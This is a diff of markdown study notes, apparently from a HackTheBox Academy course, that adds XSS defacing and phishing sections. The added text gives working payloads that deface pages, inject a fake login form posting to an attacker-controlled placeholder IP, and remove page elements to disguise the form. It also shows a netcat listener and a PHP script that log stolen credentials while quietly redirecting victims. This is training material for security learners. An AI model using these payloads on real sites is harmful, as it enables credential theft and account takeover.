@@ -1,19 +1,25 @@
 - [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
-  - [Stored XSS](#stored-xss)
-  - [Reflected XSS](#reflected-xss)
-  - [DOM XSS](#dom-xss)
-    - [Source and Sink](#source-and-sink)
-    - [DOM attacks](#dom-attacks)
-  - [XSS Discovery](#xss-discovery)
-    - [Automated Discovery](#automated-discovery)
-      - [XSS Strike example:](#xss-strike-example)
-    - [Manual Discovery](#manual-discovery)
-    - [Code Review](#code-review)
-  - [XSS Attacks](#xss-attacks)
-    - [Defacing](#defacing)
-    - [Phishing](#phishing)
-    - [Session Hijacking](#session-hijacking)
-  - [XSS Prevention](#xss-prevention)
+	- [Stored XSS](#stored-xss)
+	- [Reflected XSS](#reflected-xss)
+	- [DOM XSS](#dom-xss)
+		- [Source and Sink](#source-and-sink)
+		- [DOM attacks](#dom-attacks)
+	- [XSS Discovery](#xss-discovery)
+		- [Automated Discovery](#automated-discovery)
+			- [XSS Strike example:](#xss-strike-example)
+		- [Manual Discovery](#manual-discovery)
+		- [Code Review](#code-review)
+	- [XSS Attacks](#xss-attacks)
+		- [Defacing](#defacing)
+			- [Defacement Elements](#defacement-elements)
+			- [Changing Background](#changing-background)
+			- [Changing Page Title](#changing-page-title)
+			- [Changing Page Text](#changing-page-text)
+		- [Phishing](#phishing)
+			- [Login Form Injection](#login-form-injection)
+			- [Credential Stealing](#credential-stealing)
+		- [Session Hijacking](#session-hijacking)
+	- [XSS Prevention](#xss-prevention)
 
 ---
 
@@ -204,7 +210,198 @@ You can begin testing these payloads one by one by copying each one and adding i
 
 ### Defacing
 
+... a website means changing its look for anyone who visits the website. Although many other vulnerabilites may be utilized to achieve the same thing, XSS vulns are among the most used vulns for doing so.
+
+#### Defacement Elements
+
+Four HTML elements are usually utilized to change the main look of a web page:
+
+- Background color
+  - ```document.body.style.background```
+- Background
+  - ```document.body.background```
+- Page Title
+  - ```document.title```
+- Page Text
+  - ```DOM.innerHTML```
+
+#### Changing Background
+
+For color:
+
+```html
+<script>document.body.style.background = "#141d2b"</script>
+```
+
+For image:
+
+```html
+<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
+```
+
+#### Changing Page Title
+
+> [!NOTE]
+> The title of a page is typically defined by the ```title``` HTML tag, which appears within the ```head``` section of a web page. This title is what appears in the browser tab when you view the page.
+
+```html
+<script>document.title = 'HackTheBox Academy'</script>
+```
+
+#### Changing Page Text
+
+Using ```innerHTML```:
+
+```javascript
+document.getElementById("todo").innerHTML = "New Text"
+```
+
+Using jQuery:
+
+```javascript
+$("#todo").html('New Text');
+```
+
+> [!TIP]
+> jQuery functions can be utilized for more efficiently achieving the same thing or for changing the text of multiple elements in one line (_to do so the jQuery library must have been imported within the page source_)
+
+As hacking groups usually leave a simple message on the web page and leave nothing else on it, you can change the entire HTML code of the main ```body```, using ```innerHTML```.
+
+```javascript
+document.getElementsByTagName('body')[0].innerHTML = "New Text"
+```
+
+- specify the ```body``` element with ```document.getElementsByTagName('body')```
+- specify the first ```body``` element
+  - should change the entire web page
+
+You should prepare your HTML code separately, and then add it to your payload.
+
+```html
+<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
+
+```
+
 ### Phishing
+
+... attacks usually utilize legitimate-looking information to rick the victim into sending their sensitive information to the attacker. A common form of XSS phishing attacks is through injecting fake login forms that send the login details to the attacker's server, which may then be used to log in on behalf of the victim and gain control over their account and sensitive information.
+
+#### Login Form Injection
+
+To perform an XSS phishing attack, you must inject an HTML code that displays a login form on the targeted page. This form should send the login information to a server we are listening on, such that once a user attempts to log in, you'd get their creds.
+
+![Online Image Viewer](../../images/xss_phishing1.png)
+
+1. HTML code for a basic login form:
+
+```html
+<h3>Please login to continue</h3>
+<form action=http://YOUR_IP>
+    <input type="username" name="username" placeholder="Username">
+    <input type="password" name="password" placeholder="Password">
+    <input type="submit" name="submit" value="Login">
+</form>
+```
+
+2. Prepare the payload
+   - to write HTML to the vulnerable page, you can use ```document.write()```
+
+```javascript
+document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
+```
+
+3. Inject the payload
+
+![Please login to continue](../../images/xss_phishing2.png)
+
+4. Identify elements that need to be removed
+   - to trick the victims to think that they have to log in to be able to use the page open the Page Inspector Picker and click on the element you need to remove
+
+Example:
+
+```html
+<form role="form" action="index.php" method="GET" id='urlform'>
+    <input type="text" placeholder="Image URL" name="url">
+</form>
+```
+
+5. Clean up
+	- you can use ```document.getElementById().remove()```
+
+Example:
+
+```javascript
+document.getElementById('urlform').remove();
+```
+
+6. Concat this command to the payload used before
+
+```html
+document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
+```
+
+7. More cleaning up
+   - On the last image you can see that there still is a piece of the original HTML code: ```'>```
+   - you can remove that by just commenting it out by using ```<!--```
+
+8. Concat this command to the payload used before
+
+```html
+document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();<!--
+```
+
+![Legitimate-looking web page](../../images/xss_phishing3.png)
+
+9. Since this is a reflected XSS, you can send the malicious URL to your victim
+
+#### Credential Stealing
+
+By starting a simple netcat listener, you will capture the credentials if the victim tries to login.
+
+```bash
+d41y@htb[/htb]$ sudo nc -lvnp 80
+listening on [any] 80 ...
+
+...
+
+connect to [10.10.XX.XX] from (UNKNOWN) [10.10.XX.XX] XXXXX
+GET /?username=test&password=test&submit=Login HTTP/1.1
+Host: 10.10.XX.XX
+...SNIP...
+```
+
+However, if you are only listening with a netcat listener, it will not handle the HTTP request correctly, and the victim would get an ```Unable to connect``` error, which may raise some suspiscions. So, you can use a basic PHP script that logs the creds from the HTTP request and then returns the victim to the original page without any injections. In this case, the victim may think that they successfully logged in and will use the Image Viewer as intended.
+
+The following PHP script should do what you need. You have to write it to a file that you'll call ```index.php``` and place it in ```/tmp/tmpserver```.
+
+```php
+<?php
+if (isset($_GET['username']) && isset($_GET['password'])) {
+    $file = fopen("creds.txt", "a+");
+    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
+    header("Location: http://SERVER_IP/phishing/index.php"); // change SERVER_IP
+    fclose($file);
+    exit();
+}
+?>
+```
+
+Now you need to start a PHP listening server, which you can use instead of the basic netcat listener.
+
+```bash
+d41y@htb[/htb]$ mkdir /tmp/tmpserver
+d41y@htb[/htb]$ cd /tmp/tmpserver
+d41y@htb[/htb]$ vi index.php # at this step you wrote your index.php file
+d41y@htb[/htb]$ sudo php -S 0.0.0.0:80
+PHP 7.4.15 Development Server (http://0.0.0.0:80) started
+```
+
+If a victim tries to login, they will get redirected to the original Image Viewer page and you'll receive the creds.
+
+```bash
+d41y@htb[/htb]$ cat creds.txt
+Username: test | Password: test
+```
 
 ### Session Hijacking
 
